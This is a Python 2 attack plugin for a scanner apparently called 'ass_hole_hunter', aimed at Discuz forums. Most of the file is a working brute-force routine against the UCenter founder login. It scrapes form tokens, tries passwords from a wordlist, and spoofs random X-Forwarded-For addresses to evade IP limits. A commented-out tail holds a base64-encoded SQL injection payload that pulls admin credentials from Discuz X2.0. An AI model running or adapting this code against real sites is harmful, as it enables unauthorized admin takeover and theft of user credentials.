#coding=utf-8
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*
from sys import argv
#import os
#import httplib,re,random,urllib,time



class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Discuz 的UCenter创始人密码可被爆破',
        'author':'demon/JJ FLY',
        'update':'2015/06/05',
        'site':'http://www.dawner.info',
        'vuln_type':'burp',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-080211'
        }
    opts  = {
        'dic':'/data/tmp/url.txt or N',
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url
    

    def exploit(self):
        print 'exp2 starting...'
        #print url_get(self.url).read()
        try:
            dz_resp = url_get(self.url+'/uc_server/admin.php').read()
            print '==='
            if 'UCenter' not in dz_resp:
                print 'No UCenter...\n'
                return None
        except Exception,e:
            print e
            return None
    #通过argv获取 host 字典 间隔时间 进行爆破
        host = self.url
        print host+'.......'
        passfile= 'dbs/exploit/pass_big.txt'
        sleeptime = 3
        print '++++++++++'
        try:
            print 'url: '+host
        except Exception,e:
            print e
        print '++++++++++'
    #取域名 然后添加一些密码 

        hostuser=host.split('.')

        hostuser=hostuser[len(hostuser)-2]
        #hostuser = 'admin'

        #hostpass=[hostuser+'123',hostuser+'888',hostuser+hostuser,hostuser+'..',hostuser+'.',hostuser+'admin888',hostuser+'admin123',hostuser+'admin',hostuser+'123456','a123456']
        hostpass = []

        print '密码字典为: '+passfile

        print '间隔时间为: '+str(sleeptime)
        print os.getcwd()

        print '--->'
        
        x=self.gethashs(host).split(' ')
        f = open(passfile,'r')
        htmlpass=[]
        #htmlpass=f.read().split('\r\n')
        try:
            for line in f.readlines():
                #print line.strip()
                htmlpass.append(line.strip())

            htmlpass=hostpass+htmlpass
            print str(htmlpass)
        except Exception,e:
            print e
        f.close()

        for i in range(len(htmlpass)):

            time.sleep(float(sleeptime))

            print '正在尝试密码'+htmlpass[i]

            #if(self.getHtml(host,x[0],htmlpass[i],x[1])==''):
            if self.getHtml(host,x[0],htmlpass[i],x[1]).status == 302:
                print '密码为 '+htmlpass[i]
                alert = '[!]Pass:'+htmlpass[i]
                try:
                    r =result_write()
                    r.writelines(self.url+'\n')
                    r.writelines(alert+'\n')
                    r.writelines('vuln_name:'+self.infos['plugin_name']+'\n')
                    r.writelines('=============\n')
                    r.close()
                except Exception,e:
                    print e
                return alert


    def getHtml(self,r_host,htmlhash,htmlpass,htmlseccode):

        ip=str(random.randint(1,100))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
        ''' split path '''
        if  '//' in r_host:
            host = r_host.split('//')[1]
        if '/' in host:
            HOST = host.split('/',1)[0]
            path = host.split('/',1)[1]
        if ':' not in HOST:
            HOST = HOST+':80'
        if path == '':
            path = '/'
        print 'HOST:'+HOST
        print 'PATH:'+path
        print 'host:'+host
        postHead={"Host":HOST,"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","X-Forwarded-For":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}

        postContent='sid=&formhash='+htmlhash+'&seccodehidden='+htmlseccode+'&iframe=0&isfounder=1&password='+htmlpass+'&seccode=cccc&submit=%E7%99%BB+%E5%BD%95'
        #print ip+'\n'
        print postContent
        #print HOST.split(':')[0]
        #print HOST.split(':')[1]
        try:
            resultHtml=httplib.HTTPConnection(HOST.split(':')[0], str(HOST.split(':')[1]), False,timeout=5)
            #resultHtml=httplib.HTTPConnection('127.0.0.1','8080')
            #代理调试接口
            resultHtml.request('POST',r_host+path+'/uc_server/admin.php?m=user&a=login',body=postContent,headers = postHead )

            page=resultHtml.getresponse()
        except Exception,e:
            print e
        #pageConect=page.read()

        #return pageConect
        
        return page

    #获取 formhash  和  seccodehidden

    def gethashs(self,host):

        url= host+'/uc_server/admin.php'
    #已经添加http
        #print '====='+url

        pageContent=urllib.urlopen(url).read()

        r1=re.compile('<input type="hidden" name="formhash" value="(\S+)" />')

        htmlhash=r1.findall(pageContent)[0]

        r2=re.compile('<input type="hidden" name="seccodehidden" value="(\S+)" />')

        htmlseccode=r2.findall(pageContent)[0]
        
        #print htmlhash+' '+htmlseccode
        return htmlhash+' '+htmlseccode



#    #通过argv获取 host 字典 间隔时间 进行爆破
#
#    if(len(argv)==1):
#
#        print '---->python '+argv[0]+' host地址 字典文件 间隔时间'
#
#        print '---->python '+argv[0]+' 192.168.1.105 pass.txt 0.2'
#
#    else:
#
#        host=argv[1]
#
#        passfile=argv[2]
#
#        sleeptime=argv[3]
#
#        print '网站host为  '+host
#
#    #取域名 然后添加一些密码 
#
#        hostuser=host.split('.')
#
#        hostuser=hostuser[len(hostuser)-2]
#
#        hostpass=[hostuser+'123',hostuser+'888',hostuser+hostuser,hostuser+'..',hostuser+'.',hostuser+'admin888',hostuser+'admin123',hostuser+'admin',hostuser+'123456']
#
#        print '密码字典为  '+passfile
#
#        print '间隔时间为  '+sleeptime
#
#        print '--->'
#
#        x=gethashs(host).split(' ')
#
#        f=open(passfile,'r')
#
#        htmlpass=f.read().split('\r\n')
#
#        htmlpass=hostpass+htmlpass
#
#        f.close()
#
#        for i in range(len(htmlpass)):
#
#            time.sleep(float(sleeptime))
#
#            print '正在尝试密码'+htmlpass[i]
#
#            if(getHtml(host,x[0],htmlpass[i],x[1])==''):
#
#                print '密码为 '+htmlpass[i]
#
#                break

#    def exploit(self):
#    '''start exploit'''
#        exp_url = self.url+'forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4N0MzMjc0NzQ3QyxwYXNzd29yZCkgZnJvbSBwcmVfY29tbW9uX21lbWJlciB3aGVyZSAgdXNlcm5hbWUgbGlrZSAnYWRtaW58eHx5%3D'
#        resp = url_get(url).read()
#        try:
#            if 'admin' in resp:
#                match = re.search(r'admin\|2tt\|\S+',resp)
#                if match:
#                    print 'Discuzx2.0 Pass:'+match.group(0).split('|')[2]
                    

